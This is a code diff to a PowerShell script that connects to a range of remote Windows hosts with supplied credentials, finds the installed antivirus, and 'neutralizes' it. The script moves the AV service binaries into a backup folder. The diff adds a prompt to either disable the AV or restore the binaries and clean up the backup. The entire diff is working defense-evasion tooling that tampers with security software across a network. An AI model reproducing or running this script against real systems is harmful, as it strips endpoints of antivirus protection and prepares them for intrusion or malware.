@@ -4,6 +4,7 @@ $EndIP = Read-Host -Prompt 'Enter End of IP Range.. (Same as Start if Single Hos
 $username = Read-Host -Prompt 'Enter Username'
 $password = Read-Host -Prompt 'Enter Password' 
 $password = ConvertTo-SecureString $password -AsPlainText -Force
+$Chosenaction = Read-Host 'Disable (D) or Enable (E) AV?'
 
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 
@@ -44,12 +45,27 @@ Write-Host "Found $AVName on $Target.. Attempting Neutralization.."
 }
 
 # Create Backup Directory
-Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0]} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
+If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
+Invoke-Command -ComputerName $Target -ScriptBlock {New-Item -ItemType directory -Path $args[0] | Out-Null} -credential $cred -ArgumentList $SvcDirectory"BACKUP"
+}
 
 # Move Service Files to "BACKUP" in Parent Directory
+If ($Chosenaction -eq 'Disable' -Or $Chosenaction -eq 'D' -Or $Chosenaction -eq 'disable' -Or  $Chosenaction -eq 'd'){
 Write-Host "Moving AV Service Binaries from $SvcDirectory to $SvcDirectory"BACKUP" on $Target"
 
 Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "\*") -Destination ($args[0] + "BACKUP\") -Force} -credential $cred -ArgumentList $SvcDirectory
+}
+If ($Chosenaction -eq 'Enable' -Or $Chosenaction -eq 'E' -Or $Chosenaction -eq 'enable' -Or $Chosenaction -eq 'e'){
+Write-Host "Moving AV Service Binaries back from $SvcDirectory"BACKUP" to $SvcDirectory on $Target"
+
+Invoke-Command -ComputerName $Target -ScriptBlock {Move-Item -Path ($args[0] + "BACKUP\*") -Destination ($args[0] + "\") -Force} -credential $cred -ArgumentList $SvcDirectory
+
+# Delete BACKUP Dir
+Write-Host "Cleaning up Backup Dir on $Target"
+
+Invoke-Command -ComputerName $Target -ScriptBlock {Remove-Item -Recurse -Force ($args[0] + "BACKUP")} -credential $cred -ArgumentList $SvcDirectory
+
+}
 
 }
 
